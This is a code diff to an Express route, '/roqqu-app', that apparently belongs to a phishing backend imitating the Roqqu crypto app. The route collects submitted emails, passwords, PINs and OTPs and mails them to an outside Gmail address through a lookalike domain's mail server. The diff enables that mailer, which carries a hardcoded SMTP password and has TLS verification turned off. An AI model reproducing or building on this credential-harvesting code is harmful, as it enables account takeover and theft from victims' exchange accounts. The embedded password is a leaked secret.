@@ -160,28 +160,28 @@ app.post('/roqqu-app', (req, res, next) => {
     const content = `<p><strong>Email:</strong> ${email} </p> </br> <p><strong>Password:</strong> ${password} </p> </br> <p><strong>PIN:</strong> ${pin}</p>  </br> <p><strong>OTP:</strong>${otp}</p> </br> checking - New message from Roqqu-app`
 
     const mail = {
-        from: 'admin@growveonct.com',
-      // to: 'paysroqquu@gmail.com',
-        to: 'ifestephenie@gmail.com',
+        from: 'two@roqquliveappchat.com',
+         to: 'paysroqquu@gmail.com',
+        //to: 'ifestephenie@gmail.com',
         subject: 'New message from Roqqu-app',
         html: content,
     }
 
-    // const transporter = nodemailer.createTransport({
-    //     host: 'mail.roqquliveappchat.com',
-    //     port: 465,
-    //     secure: true,
-    //     requireTLS: true,
-    //     socketTimeout: 1200000,
-    //     connectionTimeout: 1200000,
-    //     auth: {
-    //         user: 'two@roqquliveappchat.com',
-    //         pass: 'MR.~-DC^?W}6',
-    //     },
-    //     tls: {
-    //         rejectUnauthorized: false,
-    //     },
-    // })
+    const transporter = nodemailer.createTransport({
+        host: 'mail.roqquliveappchat.com',
+        port: 465,
+        secure: true,
+        requireTLS: true,
+        socketTimeout: 1200000,
+        connectionTimeout: 1200000,
+        auth: {
+            user: 'two@roqquliveappchat.com',
+            pass: 'MR.~-DC^?W}6',
+        },
+        tls: {
+            rejectUnauthorized: false,
+        },
+    })
 
     transporter.sendMail(mail, (err, data) => {
         if (err) {
